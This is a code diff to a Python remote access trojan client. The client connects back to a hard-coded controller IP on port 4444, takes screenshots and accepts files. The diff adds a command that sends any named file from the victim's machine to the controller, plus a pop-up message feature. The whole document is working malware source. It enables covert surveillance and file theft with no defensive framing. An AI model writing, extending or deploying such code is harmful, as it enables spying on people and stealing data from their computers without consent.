@@ -1,8 +1,8 @@
 import socket, os, sys, platform, time
 import pyscreeze
+from tkinter import *
 
-
-host = "192.168.15.108"
+host = "192.168.0.13"
 port = 4444
 buffer_size = 1024
 
@@ -42,6 +42,27 @@ def take_screenshot():
     file.close()
     os.remove(picture_name)
 
+def send_file(file_directory):
+    try:
+        file_size = os.path.getsize(file_directory)
+    except:
+        send_data('NotFound'.encode())
+        return
+    send_data('pass'.encode())
+
+    time.sleep(0.5)
+
+    file = open(file_directory, "rb")
+    bytes_read = file.read(4096)
+    
+    while bytes_read:
+        send_data(bytes_read)
+        bytes_read = file.read(4096)
+    
+    time.sleep(1)
+    file.close()    
+    send_data('done'.encode())
+
 def receive_file(file_name):
     with open(file_name, "wb") as f:
         while True:
@@ -50,6 +71,26 @@ def receive_file(file_name):
                 f.close()
                 break
             f.write(bytes_read)
+
+def receive_message():
+    message = ''
+    while True:
+            bytes_read = receive_data(4096)
+            try:
+                if bytes_read == 'done'.encode():
+                    break
+                message += decode_utf8(bytes_read)
+            except:
+                pass
+    if message != '':
+        screen = Tk()
+        screen.title('Letter for you!')
+        screen.geometry('300x300')
+        screen.configure(background='#8B0000')
+        label = Label(screen, text=message, background='#8B0000', foreground='#fff')
+        label.place(x=0, y=110, width=300, height=40)
+        screen.mainloop()
+
 server_connect()
 
 while True:
@@ -63,8 +104,13 @@ while True:
             elif data == "screenshot":
                 take_screenshot()
             elif 'upload-file' in data:
-                file_name = data.split(" ")[1]
-                receive_file(file_name)
+                file_directory = data.split(" ")[1]
+                receive_file(file_directory)
+            elif 'download-file' in data:
+                file_directory = data.split(" ")[1]
+                send_file(file_directory)
+            elif 'message' in data:
+                receive_message()
             else:
                 print(data)
     except socket.error:
